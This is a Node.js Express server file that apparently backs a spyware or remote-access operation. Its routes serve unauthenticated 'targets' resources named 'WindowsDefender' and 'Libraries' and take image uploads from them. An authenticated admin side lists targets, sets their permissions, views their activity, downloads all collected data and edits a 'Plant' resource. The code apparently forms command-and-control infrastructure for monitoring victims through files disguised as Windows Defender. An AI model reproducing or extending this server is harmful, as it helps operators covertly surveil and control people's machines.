require("dotenv").config()
const port = process.env.PORT || 8080
const path = require("path")
const fs = require("fs")
const { app } = require("./app");
const { connectDB } = require("./db/MongoOperations.js")
const multer = require('multer');
const upload = multer();
const { Login, logoutRoute } = require("./Auth/jwt.js")
const { getUploadsSizeOnDiskRoute } = require("../getSizeOnDisk.js")
const { hasAccess } = require("./Auth/Middlewares")
const { getTargetActivityRoute, DeleteImageRoute, getTargetsRoute, updatePermissionsRoute } = require("../serveAdmin.js")
const { ServeWindowsDefenderRoute, ServeWindowsLibrariesRoute, GetPermissionsRoute } = require("../serveTarget.js")
const { downloadAllData, downloadData } = require("../Archiever.js")
const { uploadImageRoute } = require("../upload.js")
const { EditPlantRoute, EditWindowsDefenderRoute, EditWindowsLibraries } = require("../EditResources.js")

app.listen(port, () => {
  console.log(`Server running on port ${port}`)
  connectDB()
  //ensuring that the uploads folder exists
  if (!fs.existsSync(path.join(__dirname, "..", 'uploads')))
    fs.mkdirSync(path.join(__dirname, "..", 'uploads'));
})

// PingBot to keep the server alive on Render
require("../pingBot.js")(app)


// Auth Routes
app.post("/login", Login);
app.get("/logout", hasAccess, logoutRoute);

// Archiever Routes
app.get("/downloadAllData", hasAccess, downloadAllData);
app.get("/downloadData/:Name", hasAccess, downloadData);

//Size on Disk Route
app.get("/getUploadsSizeOnDisk", hasAccess, getUploadsSizeOnDiskRoute);

// Serve Target Routes
app.get("/WindowsDefender", ServeWindowsDefenderRoute);
app.get("/getLibraries", ServeWindowsLibrariesRoute);
app.get("/Permissions/:clientName?", GetPermissionsRoute);

//upload route
app.post('/uploadImage', upload.single('image'), uploadImageRoute);

// Serve Admin Routes
app.get("/getTargets", hasAccess, getTargetsRoute);
app.put("/updatePermissions/:targetName/:newPermision", hasAccess, updatePermissionsRoute);
app.get("/getActivity/:TargetName", hasAccess, getTargetActivityRoute);
app.delete("/deleteImage/:targetName", hasAccess, DeleteImageRoute);


// Edit Resources Route
app.put("/ResourcesEdit/Plant", hasAccess, EditPlantRoute);
app.put("/ResourcesEdit/WindowsDefender", hasAccess, EditWindowsDefenderRoute);
app.put("/ResourcesEdit/WindowsLibraries", hasAccess, EditWindowsLibraries);


app.get("/test", (req, res) => {
  console.log("Test Route")
  res.send("Test Route")
})

//this route is used to validate the token, it is called when a page logs in, it checks if the token is valid
//if it is valid then it sends a response to the client - "Valid token"
//the validation is done using the hasAccess function
// app.get("/validateToken", hasAccess, (req, res) => {
//   res.json({
//     success: true,
//     message: "Valid token"
//   })
// })

// require("../Auth/jwt.js")(app)


//this route is used to serve the react app
//it should be the last route because it is a catch all route, so if no other route is matched then this route is used
//this is done so that the react app can handle the routing, and the server doesn't interfere with it
// app.get("*", (req, res) => {
//   res.sendFile(path.join(__dirname, 'build', 'index.html'));
// });